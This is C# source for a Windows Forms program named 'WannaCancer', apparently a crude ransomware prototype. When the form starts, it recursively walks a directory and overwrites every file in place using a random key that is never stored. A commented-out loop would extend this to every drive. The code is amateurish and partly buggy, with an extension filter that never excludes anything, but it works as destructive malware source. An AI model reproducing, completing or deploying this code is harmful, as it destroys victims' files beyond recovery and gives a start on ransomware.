﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;

namespace WannaCancer3._0
{
    public partial class WannaCancer : Form
    {
        Random rand = new Random();
        private int keygen;
        public WannaCancer()
        {
            InitializeComponent();
            
            StartEncrypt();
           
        }

        private void StartEncrypt()
        {
            keygen = rand.Next(10);
            File.Create(@"C:\Files\test.dll");
            DriveInfo[] drive = DriveInfo.GetDrives();

            //foreach (DriveInfo item in drive)
            //{
            //    Encrypt(item.Name);
            //}

            Encrypt(@"C:\Files\Test\");
            Environment.Exit(0);
        }
        
        /// <summary>
        /// Encrypt Process
        /// </summary>
        /// <param name="path"></param>
        private void Encrypt(string path)
        {
            string[] directories = Directory.GetDirectories(path);
            string[] files = Directory.GetFiles(path);

            foreach (string item in files)
            {
                FileInfo file = new FileInfo(@"C:\Windows\System32\ta-IN");
                string fe = file.Extension;
                if (fe != ".exe" || fe != ".dll")
                    EncryptFile(item);
            }

            foreach (string item in directories)
            {
                Encrypt(item);
            }
        }

        private void EncryptFile(string path)
        {
            try
            {
                FileStream fs = new FileStream(path, FileMode.Open);
                byte[] orginal = new byte[fs.Length];

                for (int i = 0; i < fs.Length; i++)
                {
                    orginal[i] = (byte)fs.ReadByte();
                }

                char[] charSet = new char[orginal.Length];

                charSet = Encoding.Default.GetChars(orginal);

                for (int i = 0; i < fs.Length; i++)
                {
                    charSet[i] += (char)keygen;
                }

                byte[] encrypt = new byte[fs.Length];
                encrypt = Encoding.Default.GetBytes(charSet);
                fs.Position = 0;
                fs.Write(encrypt, 0, encrypt.Length);
                fs.Close();

            }
            catch
            {
                return;
            }
        }
    }
}
